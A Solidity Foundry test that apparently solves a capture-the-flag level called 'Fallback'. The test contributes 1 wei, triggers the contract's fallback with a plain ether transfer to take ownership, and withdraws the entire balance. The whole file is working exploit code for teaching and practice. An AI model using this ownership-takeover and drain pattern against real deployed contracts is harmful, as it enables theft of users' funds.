// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback public target;
    address player;

    function setUp() public {
        target = new Fallback();
        vm.deal(player, 100 ether);
    }

    function testAttack() public {
        vm.startPrank(player);
        target.contribute{value: 1 wei}();
        (bool sent, ) = address(target).call{value: 1 wei}("");
        require(sent, "failed to sent ether");
        target.withdraw();
        assertEq(target.owner(), player);
        assertEq(address(target).balance, 0);
    }
}
